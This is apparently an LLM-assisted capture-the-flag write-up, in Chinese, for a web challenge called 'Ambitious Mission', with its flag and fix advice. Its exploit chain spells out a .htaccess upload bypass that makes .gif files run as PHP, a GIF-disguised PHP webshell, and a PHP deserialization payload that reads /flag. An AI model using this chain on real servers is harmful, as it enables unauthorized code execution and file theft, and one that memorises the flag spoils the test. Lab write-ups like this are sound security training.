# Ambitious Mission · 渗透记录

## 2.1 基本信息
| 字段 | 内容 |
|---|---|
| 题目 | Ambitious Mission |
| 类型 | Web / 文件上传（.htaccess 绕过）+ PHP 对象注入 |
| 入口 | http://pv5cl84fwfwuwkuz.neu-nex.fun |
| 耗时 | 0 日 0 时 5 分 30 秒 |
| LLM | deepseek-flash |
| flag | `nex{AmBL7loUs_MIS510n_6qm62mgz}` |

## 2.2 目标与授权
- 授权范围：仅题目域名 80 端口；上传物用后即删，未做持久化/横向
- 禁止动作：DoS、横向移动、持久化、读取无关数据

## 2.3 侦察与指纹
首页「文件上传」单文件表单；Server: nginx，X-Powered-By: PHP/8.2.33；404 页由 Apache/2.4.68 (Debian) 生成，即 nginx -> Apache -> mod_php；/upload/ 有 index.html 占位防列举

## 2.4 攻击面
1) POST / multipart file=（原始文件名落盘 /upload/）2) /read.php?data=（unserialize 对象注入）3) /upload/ 静态目录（可直读上传物）

## 2.5 漏洞判定
- 类型：Web / 文件上传（.htaccess 绕过）+ PHP 对象注入
- 位置：/read.php?data=
- 证据：evidence/step5_resp.txt、step6_resp.txt（GET 带 no-cache 与 POST 两种形态均回显同一 flag）；step4_resp.txt（read.php 源码，base64 形式存放，配合 evidence/step4_read.php.b64 解码）；step3b_resp.txt（.htaccess + GIF 伪装 PHP 落地执行）
- 误报排除：上传 .php/.phtml/.pht/.phar/.shtml 均回「这种后缀想都别想」，排除直接传 webshell；.user.ini 上传成功但后端是 Apache+mod_php 不生效，排除；read.php 初测恒 200 空，实为代理缓存，加 Cache-Control: no-cache 或改 POST 即通；RCE 直读 /flag 返回 false（open_basedir=/var/www/html:/tmp），排除「上传直接拿 flag」

## 2.6 利用链
```
POST / multipart file=.htaccess（无扩展名放行）
  body: AddType application/x-httpd-php .gif
POST / multipart file=shell.gif（内容 GIF89a + <?php ... ?>）
  /upload/.htaccess 生效后 .gif 被当 PHP 执行 -> RCE（system/exec/shell_exec 被禁用，用 file_get_contents/scandir 仍可）
GET /upload/src.gif -> dump /var/www/html/{index.php,read.php}
  read.php: class Store{__destruct(){echo $this->item;}} class Wrapper{__toString(){return $this->obj->read();}} class Reader{__call(){return file_get_contents($this->file);} $file='/flag'}
GET /read.php?data=O:5:"Store":1:{s:4:"item";O:7:"Wrapper":1:{s:3:"obj";O:6:"Reader":1:{s:4:"file";s:5:"/flag";}}}  (Cache-Control: no-cache)
  -> 200  nex{AmBL7loUs_MIS510n_6qm62mgz}
```

## 2.7 影响
未授权 PHP 代码执行（www-data，受 open_basedir 限制）+ 通过对象注入读取 /flag；上传目录可写入任意文件，若被解析可长期驻留

## 2.8 修复建议
上传白名单按扩展名+真实图片内容双校验，禁止无扩展名/.htaccess/.user.ini 落盘；上传目录 disable_scripts（Apache: php_admin_flag engine off / nginx 不给 PHP 解析）；不要 unserialize 用户输入，必要时 allowed_classes 白名单；open_basedir 保持最小集

## 2.9 复盘
read.php 空响应是代理缓存所致，加 no-cache 才通；黑名单漏 .htaccess，才认出后端是 Apache。
